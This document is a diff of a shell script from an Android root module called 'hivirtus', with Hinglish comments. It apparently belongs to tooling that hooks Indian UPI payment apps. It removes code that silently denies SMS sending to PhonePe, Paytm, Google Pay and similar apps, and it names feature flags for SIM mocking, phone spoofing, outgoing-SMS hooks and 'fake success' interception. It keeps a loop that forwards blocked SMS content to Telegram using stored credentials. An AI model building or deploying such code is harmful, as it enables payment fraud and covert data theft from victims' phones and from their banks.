@@ -139,10 +139,10 @@ mark_active() {
 
 sync_config
 
-seed_apatch_config
-seed_hooked_pkgs
+# NEVER seed APatch package_config (phone/telephony exclude=0 → SIM crash)
+# NEVER mass-seed hooked_pkgs from csv
 
-# Reboot pe bridge.dex + overlay flag + display overlay permission
+# Boot: repair SIM/settings + safe overlay only
 MODDIR="$MODDIR" hivirtus_boot_activate_overlay
 hivirtus_grant_overlay_permission &
 
@@ -178,44 +178,12 @@ hivirtus_grant_overlay_permission &
   done
 ) &
 
-# Mock SIM ON → Messages/UPI ko SEND_SMS deny (root se — overlay root ke bina bhi)
-sms_block_wanted() {
-  [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && return 0
-  SRC=""
-  [ -f "$RUNTIME" ] && SRC="$RUNTIME"
-  [ -z "$SRC" ] && [ -f "$CONFIG" ] && SRC="$CONFIG"
-  [ -z "$SRC" ] && return 1
-  grep -qE '"hook_outgoing_sms"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
-  grep -qE '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
-  grep -qE '"enable_virtual_sim"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
-  grep -qE '"enable_sim1_mock"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
-  grep -qE '"enable_phone_spoof"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
-  return 1
-}
+# DISABLED: appops SEND_SMS deny — system/SIM break + "sab apps hooked" feel
+# SMS intercept sirf Zygisk client hook se (UPI process me)
+enforce_sms_block() { return 0; }
 
-enforce_sms_block() {
-  # SAFE: com.android.phone pe kabhi appops mat lagao (SIM/radio break)
-  sms_block_wanted || return 0
-
-  HOOKED=""
-  for f in /data/local/tmp/hivirtus_hooked_pkgs.txt /data/local/tmp/hivirtus_active_upi_all.txt; do
-    [ -f "$f" ] && HOOKED="$HOOKED $(cat "$f" 2>/dev/null | tr '\n' ' ')"
-  done
-  if [ -f "$ACTIVE_PKG" ]; then
-    HOOKED="$HOOKED $(cat "$ACTIVE_PKG" 2>/dev/null | tr -d '\r\n ')"
-  fi
-
-  for pkg in com.phonepe.app net.one97.paytm com.google.android.apps.nbu.paisa.user \
-    com.yespay.next com.kreditbee.android com.groww.app com.nextbillion.groww \
-    com.fampay.in com.mobikwik_new $HOOKED; do
-    [ -z "$pkg" ] && continue
-    case "$pkg" in
-      com.android.phone|com.android.providers.telephony|com.android.systemui) continue ;;
-    esac
-    appops set "$pkg" SEND_SMS deny 2>/dev/null
-    cmd appops set "$pkg" SEND_SMS deny 2>/dev/null
-  done
-}
+seed_hooked_pkgs() { return 0; }
+seed_apatch_config() { return 0; }
 
 read_tg_creds() {
   TG_TOKEN=""
@@ -287,33 +255,11 @@ ${BLOCKED_BODY}"
   fi
 }
 
-seed_hooked_pkgs() {
-  SRC_LIST="$MODDIR/apatch_package_config_full.csv"
-  [ ! -f "$SRC_LIST" ] && return 0
-  OUT="/data/local/tmp/hivirtus_hooked_pkgs.txt"
-  awk -F, 'NR>1 && $2==0 && $1 ~ /^com\./ {print $1}' "$SRC_LIST" 2>/dev/null | grep -vE '^(com\.android\.|bin\.|org\.)' > "$OUT" 2>/dev/null
-  chmod 644 "$OUT" 2>/dev/null
-}
-
-seed_apatch_config() {
-  SRC="$MODDIR/apatch_package_config_full.csv"
-  DST="/data/adb/ap/package_config"
-  FLAG="/data/local/tmp/hivirtus_apatch_config_seeded.flag"
-  [ ! -f "$SRC" ] || [ ! -d /data/adb/ap ] && return 0
-  if [ -f "$DST" ]; then
-    LINES=$(wc -l < "$DST" 2>/dev/null || echo 0)
-    [ "$LINES" -gt 50 ] && touch "$FLAG" 2>/dev/null && return 0
-  fi
-  [ -f "$FLAG" ] && return 0
-  cp -f "$SRC" "$DST" 2>/dev/null
-  chmod 644 "$DST" 2>/dev/null
-  echo 1 > "$FLAG"
-  chmod 644 "$FLAG" 2>/dev/null
-}
+seed_hooked_pkgs() { return 0; }
+seed_apatch_config() { return 0; }
 
 (
   while true; do
-    enforce_sms_block
     forward_blocked_telegram
     sleep 2
   done
@@ -321,7 +267,9 @@ seed_apatch_config() {
 
 (
   while true; do
+    hivirtus_repair_sim_settings
+    sleep 180
     hivirtus_grant_overlay_permission
-    sleep 30
+    sleep 60
   done
 ) &
